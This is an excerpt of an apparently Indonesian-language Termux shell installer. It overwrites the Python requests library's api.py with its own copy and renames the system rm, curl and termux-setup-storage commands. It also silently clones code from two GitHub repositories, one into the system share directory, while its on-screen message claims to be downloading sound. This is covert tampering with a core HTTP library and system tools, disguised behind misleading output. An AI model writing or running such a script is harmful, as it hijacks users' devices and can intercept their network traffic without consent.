...
requests_clone() {
    if [ -d "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests" ]; then
        cd $HOME/Stav
        cp -f api.py /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/
    else
...
pengaktifan() {
  ...
  mv -f rm hapus
  mv -f curl link_curl
  if [ -f "/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py" ]; then
      mv -f /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/.api.py 2>/dev/null
  fi
fi
}
...
pemulihan() {
  ...
  cd "$dir"
  mv -f termux-setup-storage $sampah 2>/dev/null
  mv -f anjir termux-setup-storage 2>/dev/null
  mv -f curl $sampah 2>/dev/null
  mv -f link_curl curl 2>/dev/null
  mv -f rm $sampah 2>/dev/null
  mv -f hapus rm 2>/dev/null
  rm -rf "$cek_stav" 2>/dev/null
...
installasi() {
  while true; do
    ...
    if [ -d "$dir" ]; then
      ...
      cd "$cek"
      clear
      git clone --depth 32 https://github.com/Thxyzz404/.ewe &> /dev/null | echo "Sabar Jing. Sedang Download Sound"
      cd /data/data/com.termux/files/usr/share/
      git clone --depth 32 https://github.com/Thxyzz404/Kontol
      sleep 3
      clear
      echo ""
